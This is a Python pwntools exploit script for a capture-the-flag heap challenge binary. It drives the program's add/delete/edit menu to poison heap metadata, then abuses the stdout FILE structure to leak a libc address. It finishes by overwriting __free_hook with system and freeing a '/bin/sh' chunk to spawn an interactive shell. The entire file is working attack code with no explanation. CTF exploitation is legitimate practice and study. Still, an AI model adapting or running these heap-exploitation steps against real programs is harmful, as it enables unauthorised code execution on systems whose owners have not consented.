#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from pwn import *
from time import sleep

exe  = context.binary = ELF('./chall')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 1337)

p = lambda x: p64(x)

idx=-1

def option(choice):
	io.sendlineafter(b"> ", str(choice).encode('latin-1'))

def add(size, data):
	global idx
	idx+=1
	print(f"add {idx} {size}")
	option(1)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))
	io.sendlineafter(b"enter the size : ", str(size).encode('latin-1'))
	io.sendafter(b"Input : ", data)
	return idx

def delete(idx):
	print(f"delete {idx}")
	option(2)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))

def edit(idx, data):
	print(f"edit {idx}")
	option(4)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))
	io.sendafter(b"Input : ", data)

def show(idx):
	option(3)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))
	return io.recvline()

libc=ELF("./libc.so.6")
io = process("./chall")
# io = remote("127.0.0.1", "9856")

leak=0xc760
for i in range(4):
	add(0x20-8, b"A"*16)
add(0x100-8, b"X"*0x90)
x=add(0x20-8, b"X"*16)
for i in range(4):
	delete(i)
edit(1, p(0x0000000000000001) + p(0x0010000000000000) + p(0)*6 + b"\x88")
delete(x)
add(64, b"A"*64)
add(64, b"A"*64)
delete(4)
add(0x20-8, b"\xff")
edit(1, p(0x0000000000000001) + p(0x0010000000000000) + p(0)*6 + p16(leak))
delete(7)
fake_21 = p(0) + p(0x21) + p(0)*2
add(0x20-8, p(0xfbad1800))
edit(1, p(0x0000000000000001) + p(0x0000000000000000) + b"\x00"*0x210 + fake_21*9 + p(0) + p(0x101) + b"\x00"*0xf0 + p(0x100) + p(0x20) + p(0)*2 + fake_21 + p(0) + p(0x21) + p(0x1337) )
edit(7, p64(0xfbad1800) + p64(0x0)*3 + b"\x00")
sleep(2)
print(hexdump(io.recvn(8)))
a=io.recvn(6)
libc.address = u64(a.ljust(8, b"\x00"))-0x3ed8b0
print(hex(libc.address))
delete(0)
delete(1)
edit(1, p(0x0000000000000000) + p(0x0000000000000000) + b"\x00"*0x210 + fake_21 + p(0) + p(0x21) + b"/bin/sh\x00" + p(0) + fake_21*7 + p(0) + p(0x101) + b"\x00"*0xf0 + p(0x100) + p(0x20) + p(0)*2 + fake_21 + p(0) + p(0x21) + p(0x1337) + p(libc.sym['__free_hook']) )
edit(7, p(libc.sym.system))
delete(0)
io.interactive()
